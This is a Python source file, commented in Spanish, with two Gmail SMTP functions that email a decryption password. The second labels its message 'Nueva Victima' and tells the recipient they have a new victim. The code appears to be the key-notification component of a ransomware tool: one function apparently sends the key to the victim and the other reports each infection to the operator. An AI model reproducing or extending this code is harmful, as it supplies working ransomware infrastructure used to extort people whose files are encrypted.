#pip install secure-smtplib

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def enviar_contrasena(destinatario, contrasena, remitente, clave_app):
    """
    Envía un correo con una contraseña al destinatario.

    Parámetros:
    - destinatario: correo electrónico del receptor
    - contrasena: la contraseña que se va a enviar
    - remitente: correo del que se envía (ej: tu Gmail)
    - clave_app: contraseña de aplicación del remitente
        Si usas Gmail, necesitas una contraseña de aplicación
        no tu contraseña real. Para generarla:
        Activa la verificación en dos pasos en tu cuenta de Google.
        Ve a: https://myaccount.google.com/apppasswords
        Genera una contraseña de 16 dígitos para aplicaciones SMTP.
        Usa esa clave en clave_app.
    """

    # Crear el mensaje
    mensaje = MIMEMultipart()
    mensaje['From'] = remitente
    mensaje['To'] = destinatario
    mensaje['Subject'] = 'Recuperación de Contraseña'

    cuerpo = f"""\
    Hola,
    Tu contraseña para desencriptar es: {contrasena}

    """

    mensaje.attach(MIMEText(cuerpo, 'plain'))

    try:
        # Conexión segura al servidor SMTP de Gmail
        servidor = smtplib.SMTP('smtp.gmail.com', 587)
        servidor.starttls()
        servidor.login(remitente, clave_app)

        # Enviar el correo
        servidor.send_message(mensaje)
        servidor.quit()
        print("Correo enviado correctamente.")
        return True

    except Exception as e:
        print(f"Error al enviar correo: {e}")
        return False

def enviar_contrasena2(destinatario, contrasena, remitente, clave_app):
    """
    Envía un correo con una contraseña al destinatario.

    Parámetros:
    - destinatario: correo electrónico del receptor
    - contrasena: la contraseña que se va a enviar
    - remitente: correo del que se envía (ej: tu Gmail)
    - clave_app: contraseña de aplicación del remitente
        Si usas Gmail, necesitas una contraseña de aplicación
        no tu contraseña real. Para generarla:
        Activa la verificación en dos pasos en tu cuenta de Google.
        Ve a: https://myaccount.google.com/apppasswords
        Genera una contraseña de 16 dígitos para aplicaciones SMTP.
        Usa esa clave en clave_app.
    """

    # Crear el mensaje
    mensaje = MIMEMultipart()
    mensaje['From'] = remitente
    mensaje['To'] = destinatario
    mensaje['Subject'] = 'Nueva Victima'

    cuerpo = f"""\
    Hola, tienes una nueva victima:
    la contraseña para desencriptar es: {contrasena}

    """

    mensaje.attach(MIMEText(cuerpo, 'plain'))

    try:
        # Conexión segura al servidor SMTP de Gmail
        servidor = smtplib.SMTP('smtp.gmail.com', 587)
        servidor.starttls()
        servidor.login(remitente, clave_app)

        # Enviar el correo
        servidor.send_message(mensaje)
        servidor.quit()
        print("Correo enviado correctamente.")
        return True

    except Exception as e:
        print(f"Error al enviar correo: {e}")
        return False